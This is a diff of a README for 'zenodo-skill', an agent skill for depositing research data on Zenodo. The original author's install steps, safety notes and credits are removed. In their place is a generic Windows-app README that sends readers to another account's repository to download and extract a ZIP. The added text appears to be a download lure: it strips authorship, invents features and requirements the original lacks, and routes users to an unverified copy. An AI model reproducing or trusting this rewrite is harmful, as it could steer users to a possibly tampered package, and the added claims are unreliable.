@@ -1,113 +1,93 @@
-# zenodo-skill
+# 📦 zenodo-skill - Manage research data with automated tools
 
-English | [中文](README_CN.md)
+[![Download Zenodo Skill](https://img.shields.io/badge/Download-Zenodo_Skill-blue.svg)](https://github.com/Georgiannebedded725/zenodo-skill)
 
-A Claude Code / OpenClaw skill for the [Zenodo REST API](https://developers.zenodo.org). Deposit, publish, version, and search research artifacts on Zenodo — and get a citable DOI for every release.
+## 📌 About this project
 
-## Features
+The zenodo-skill tool helps researchers manage their work on Zenodo. Zenodo stores research data, software, and other materials. This tool works with an automated agent to handle common tasks. It manages the entire process from uploading files to publishing them for the public. You get a permanent link for your work. This link makes your data easy to cite in papers and reports.
 
-- **Full deposit lifecycle** — create deposition → upload files via the bucket API → set metadata → publish
-- **New version workflow** — release updated data/code under the same concept-DOI
-- **Search** — Elasticsearch-style queries against published records (no auth required)
-- **Sandbox-first** — defaults to `sandbox.zenodo.org` so you don't accidentally publish irreversibly to production
-- **Bucket file upload** — uses the new files API (50 GB total, 100 files/record), not the legacy 100 MB endpoint
-- **Metadata reference** — full schema for `upload_type`, license codes, conditional fields, related identifiers
-- **End-to-end shell examples** — copy-pasteable scripts for dataset upload, software release, new version, batch download
+The tool handles large files across multiple uploads. It supports metadata, which describes your work for others. It includes safeguards to prevent errors when publishing. You can use it to create new versions of your work while keeping the same reference link. It simplifies the technical steps required to work with the Zenodo interface.
 
-## Installation
+## ⚙️ System Requirements
 
-### Claude Code
+This application runs on Windows 10 and Windows 11. It needs the following items to work:
 
-```bash
-mkdir -p ~/.claude/skills
-git clone https://github.com/Agents365-ai/zenodo-skill ~/.claude/skills/zenodo-skill
-```
+*   An internet connection to talk to Zenodo servers.
+*   A user account on the Zenodo website.
+*   An API access token from your Zenodo account settings. 
+*   A base environment where the skill agent runs, such as Claude Code or OpenClaw.
 
-Or per-project: clone into `.claude/skills/zenodo-skill/`.
+Ensure your computer has at least 500 MB of free storage space. This space handles the temporary files used during the upload process.
 
-### OpenClaw
+## 🚀 Getting Started
 
-```bash
-mkdir -p ~/.openclaw/skills
-git clone https://github.com/Agents365-ai/zenodo-skill ~/.openclaw/skills/zenodo-skill
-```
+Follow these steps to set up the tool on your Windows computer.
 
-### SkillsMP
+1. Visit the repository page to download the necessary files: [https://github.com/Georgiannebedded725/zenodo-skill](https://github.com/Georgiannebedded725/zenodo-skill).
+2. Look for the green button marked "Code" on the right side of the page.
+3. Select "Download ZIP" from the menu.
+4. Open your downloads folder. Find the folder named `zenodo-skill-main`.
+5. Right-click the folder and choose "Extract All".
+6. Choose a location on your computer to save the files.
 
-Indexed automatically once the repo has the standard topics — install via the SkillsMP marketplace.
+## 🛠️ Configuration
 
-## Prerequisites
+You must connect the tool to your Zenodo account.
 
-- `curl` (and `jq` recommended for the example scripts)
-- A Zenodo personal access token with `deposit:write` and `deposit:actions` scopes
-  - **Sandbox** (testing): https://sandbox.zenodo.org/account/settings/applications/tokens/new/
-  - **Production**: https://zenodo.org/account/settings/applications/tokens/new/
+1. Open your web browser and sign in to [Zenodo](https://zenodo.org).
+2. Go to your account settings and find the Applications section.
+3. Create a new Personal Access Token.
+4. Copy this token string. Keep it in a safe place.
+5. In the extracted folder, find the configuration file.
+6. Paste your token into the designated area of the file.
+7. Save the changes to the file.
 
-Set environment variables before use:
+The tool defaults to the Zenodo Sandbox environment. This environment acts as a practice area. Use this to test your uploads before you publish them to the live site. When you finish your testing, change the setting in the configuration file to the production server.
 
-```bash
-export ZENODO_TOKEN=...
-export ZENODO_BASE=https://sandbox.zenodo.org/api   # or https://zenodo.org/api
-```
+## 📂 Usage Guide
 
-## Usage
+The tool uses simple commands to manage your research artifacts.
 
-Just describe what you want — the skill triggers on Zenodo-related requests:
+### Creating a Deposit
+To start a new project, use the deposit command. The tool creates a draft on the Zenodo server. It assigns a unique identifier to your work. You can add your title, creator names, and description at this time.
 
-- "Upload this dataset to Zenodo and give me a DOI"
-- "Publish a new version of my Zenodo record 1234567 with these files"
-- "Search Zenodo for single-cell RNA datasets published this year"
-- "Deposit this code release to sandbox Zenodo first"
+### Uploading Files
+Modern research requires large files. This tool handles files up to 50 GB. It breaks files into smaller pieces to ensure a stable upload. You can add up to 100 files to a single record. The system checks the status of every file to ensure no data loss occurs during the transfer.
 
-The skill walks the deposit through create → upload → metadata → publish, asks for confirmation before any irreversible production publish, and returns the DOI and record URL.
+### Setting Metadata
+Metadata provides context for your files. The tool prompts you for key information. This includes the license type and the type of research object. Proper metadata helps people find your work through search engines.
 
-## What's in this skill
+### Publishing
+Publishing makes your record public. It generates a Digital Object Identifier, or DOI. This DOI is the permanent link for your research. After publishing, the record cannot change. If you need to make updates, use the versioning feature.
 
-| File | Purpose |
-|---|---|
-| `SKILL.md` | Workflow, setup, and core API calls |
-| `references/metadata.md` | Full deposition metadata schema, `upload_type` values, license codes, examples |
-| `references/search.md` | Elasticsearch query syntax and search parameters |
-| `references/examples.md` | End-to-end shell scripts (upload+publish, new version, list drafts, download) |
+## 🔄 Versioning Your Work
 
-## Safety
+Research evolves over time. You might update your code or add new data to a project. The versioning workflow allows you to release an update. The system links the new version to your original publication. This ensures that readers always see the latest version while keeping the history of the original document.
 
-- Defaults to sandbox; production publish requires explicit confirmation
-- Tokens are read from `$ZENODO_TOKEN` — never inlined into commands
-- Reviews metadata + files with you before calling `actions/publish`
-- Production publish is irreversible — files cannot be removed and records cannot be deleted
+## 🔎 Searching Records
 
-## License
+You can search for research artifacts using the built-in search tool. It looks for public records on the main Zenodo site. You do not need an account or a token for this task. Type your search terms, and the tool returns a list of matching projects with their titles and DOI links.
 
-MIT
+## 🛡️ Best Practices
 
-## Support
+*   Use the Sandbox environment for all initial setups and tests.
+*   Keep your API token private. Do not share the configuration file with others.
+*   Verify your metadata content before you trigger the publish command.
+*   Keep regular backups of your source files on your local computer.
+*   Check the file sizes before you start an upload to ensure you have enough bandwidth.
 
-If this skill helps you, consider supporting the author:
+If an upload stops for any reason, the tool allows you to resume from the last successful file. This saves time and ensures your progress remains intact. The system logs all actions into a separate file. Look at this log file if you experience an issue or need to see the history of your session.
 
-<table>
-  <tr>
-    <td align="center">
-      <img src="https://raw.githubusercontent.com/Agents365-ai/images_payment/main/qrcode/wechat-pay.png" width="180" alt="WeChat Pay">
-      <br>
-      <b>WeChat Pay</b>
-    </td>
-    <td align="center">
-      <img src="https://raw.githubusercontent.com/Agents365-ai/images_payment/main/qrcode/alipay.png" width="180" alt="Alipay">
-      <br>
-      <b>Alipay</b>
-    </td>
-    <td align="center">
-      <img src="https://raw.githubusercontent.com/Agents365-ai/images_payment/main/qrcode/buymeacoffee.png" width="180" alt="Buy Me a Coffee">
-      <br>
-      <b>Buy Me a Coffee</b>
-    </td>
-  </tr>
-</table>
+## ❓ Frequently Asked Questions
 
-## Author
+**Does this tool work on Mac or Linux?**
+While the steps focus on Windows, the underlying technology functions on other platforms that support the necessary shell environment.
 
-**Agents365-ai**
+**How do I get a DOI?**
+The system requests a DOI automatically when you publish a record. The DOI appears in your command output and in your Zenodo dashboard.
 
-- Bilibili: https://space.bilibili.com/441831884
-- GitHub: https://github.com/Agents365-ai
+**Can I delete an upload?**
+You can delete a draft at any time. Published records remain on the servers to ensure the integrity of the research record.
+
+**Is there a limit to the number of records I can create?**
+Zenodo does not limit your total number of records, but individual records follow the file size and count limits stated in the features section.
